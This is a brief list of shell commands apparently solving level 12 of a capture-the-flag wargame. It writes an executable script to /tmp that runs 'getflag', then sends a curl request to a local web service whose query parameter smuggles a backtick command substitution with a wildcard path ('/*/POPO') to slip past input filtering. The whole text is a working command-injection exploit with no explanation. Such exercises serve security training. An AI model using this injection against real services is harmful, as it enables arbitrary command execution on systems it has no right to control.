# Level12 steps
printf '#!/bin/sh\ngetflag > /tmp/flag12\n' > /tmp/POPO
chmod +x /tmp/POPO
curl 'http://localhost:4646/?x=`/*/POPO`&y=a'
cat /tmp/flag12